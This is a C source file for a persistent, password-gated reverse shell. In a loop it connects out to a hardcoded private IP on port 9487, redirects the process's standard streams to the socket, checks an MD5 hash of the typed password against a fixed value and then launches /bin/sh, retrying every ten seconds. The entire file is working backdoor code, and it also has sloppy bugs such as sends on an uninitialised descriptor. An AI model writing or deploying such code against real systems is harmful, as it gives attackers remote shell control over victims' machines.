#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "md5.h"

int main()
{

	int resultfd, sockfd;
	int port = 9487;
	struct sockaddr_in my_addr;
	char buffer[1024];

	// syscall 102
	// int socketcall(int call, unsigned long *args);

	// sycall socketcall (sys_socket 1)
	//sockfd = socket(AF_INET, SOCK_STREAM, 0);

	// syscall socketcall (sys_setsockopt 14)
        int one = 1;
	//#setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

	// set struct values
	my_addr.sin_family = AF_INET; // 2
	my_addr.sin_port = htons(port); // port number
	my_addr.sin_addr.s_addr = inet_addr("192.168.110.55"); // 0 fill with the local IP
	
	while(1){
		sockfd = socket(AF_INET, SOCK_STREAM, 0);
		memset(my_addr.sin_zero, '\0', sizeof(my_addr.sin_zero));
		if(connect(sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr)) >= 0){


			//recv(sockfd, buffer, 1024, 0);
			// syscall 63
			dup2(sockfd, 2);
			dup2(sockfd, 1);
			dup2(sockfd, 0);
			
			char *s3cr3t = "bd1733f3b772d18d2ea42da6109bcd78";//"22a4d9b04fe95c9893b41e2fde83a427";
			send(sockfd, "Enter: ", 8, 0);	
			//fflush(stdout);
			char *inputp[10];
			scanf("%10s", inputp);
		
			char *pass = findmd5(inputp);
			if(strcmp(s3cr3t, pass)==0){
				//fprintf(1, "Accept!");
				//fflush(stdout);
				send(sockfd, "Accept!", 8, 0);
				int pid = fork();
				if(pid == -1){
					send(resultfd, "Error..", 8, 0);
					//printf("Error. ");
				}else if(pid == 0){
					execve("/bin/sh", NULL, NULL);
				}
				else{
					int status;
					waitpid(pid, &status, 0);
					
				}
				
			}
			else{
				send(resultfd, "Reject!", 8, 0);
				//printf("Reject!");			
			}
			close(sockfd);
		}
		sleep(10);
		// syscall 11
		//execve("/bin/sh", NULL, NULL);
	}
	return 0;
}
